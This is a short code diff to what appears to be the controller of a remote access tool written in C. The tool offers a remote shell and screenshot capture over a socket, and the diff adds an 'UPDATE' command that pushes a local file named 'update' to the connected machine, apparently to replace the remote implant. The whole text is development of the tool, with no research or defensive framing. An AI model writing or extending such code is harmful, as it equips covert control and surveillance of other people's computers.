@@ -63,10 +63,18 @@ void handle_shell(int socket) {
 	}
 }
 
+void send_update(int socket){
+	int fd = open("update", O_RDONLY);
+	if(fd < 0){
+		perror("update");
+		exit(1);
+	}
+	get_screenshot(socket, fd);	
+}
 
 void interact(int socket) {
 
-	printf("---MENU---\n1: SHELL\n2: SCREENSHOT\n---FIN---\n");
+	printf("---MENU---\n1: SHELL\n2: SCREENSHOT\n3: UPDATE\n---FIN---\n");
 	char *input = read_input();
 	int choix = 0; 
 
@@ -74,7 +82,7 @@ void interact(int socket) {
 
 		int i;
 
-		for( i = 0; i < 3; i++) {
+		for( i = 0; i < 4; i++) {
 			if ( strchr(input, i + '0') != NULL) {
 				choix = i;
 			}
@@ -95,6 +103,9 @@ void interact(int socket) {
 			 }
 			 get_screenshot(fd, socket);
 			 break;
+		case 3:
+			send_update(socket);
+		break;
 	}
 }
 
